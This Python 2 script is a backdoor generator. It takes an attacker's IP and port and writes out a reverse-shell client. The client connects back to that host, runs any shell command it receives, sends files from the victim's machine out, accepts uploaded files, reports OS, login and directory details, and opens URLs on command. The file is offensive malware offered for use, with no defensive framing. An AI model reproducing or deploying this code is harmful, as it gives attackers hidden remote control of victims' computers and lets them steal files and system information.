from optparse import OptionParser
from sys import argv
from colorama import Fore

op = OptionParser ('--connection-ip <ip> -p <port>')
op.add_option ('--connection-ip', dest='bi', type='string')
op.add_option ('-p', '--port', dest='port', type='string')
(op, args) = op.parse_args ()

maket = '''
import socket
import subprocess
from sys import argv
import os
from platform import platform, system, version, machine
import webbrowser
    
s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("''' + op.bi + '''", ''' + op.port + '''))
    
while True:
    
    dt = s.recv (1024)
    
    if dt == 'quit':
        s.close ()
        break
    elif dt.split (':')[0] == 'dload':
        try:
            text_for_send = ''
            f = open (dt.split (':')[1], 'r')
            for i in f:
                text_for_send += i
            s.sendall ('dl:' + text_for_send)
            f.close ()
        except:
            s.send ('error')
    elif dt == 'revers':
        s.send (' ')
    elif dt.split (':')[0] == 'uload':
        content_to_load = dt.split (':')[0:]
        s.send ('tit')
        file_p = s.recv (1024)
        if file_p != '':
            f = open (file_p, 'w')
            f.write (content_to_load)
            f.close ()
            s.send ('suc')
    elif dt == 'getos':
            os_info = \'''
        
        
            Platform: \''' + platform () + \'''
            System: \''' + system () + \'''
            Version: \''' + version () + \'''
            Machine: \''' + machine () + \'''
            Login: \''' + os.getlogin () + \'''
            Current Working Directory: \''' + os.getcwd () + \'''
        
        
            \'''
            
            s.send (os_info)
            
    elif dt.split (':')[0] == 'chdir':
        os.chdir(dt.split (':')[1])
    elif dt.split (':')[0] == 'wopen':
        webbrowser.open (dt.split (':')[1])
        s.send ('WebBrowser opened!')
    else:
        proc = subprocess.Popen (dt, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        out = proc.stdout.read () + proc.stderr.read ()
        if out.strip (' ') != '':
            s.send (out)
        else:
            s.send ('Command executed!')

'''

try:
    f = open (argv [-1], 'w')
    f.write (maket)
    f.close ()
    print Fore.CYAN + '[*] ' + Fore.RESET + ' Backdoor created!'
except:
    print Fore.RED + '[!]' + Fore.RESET + ' Error!'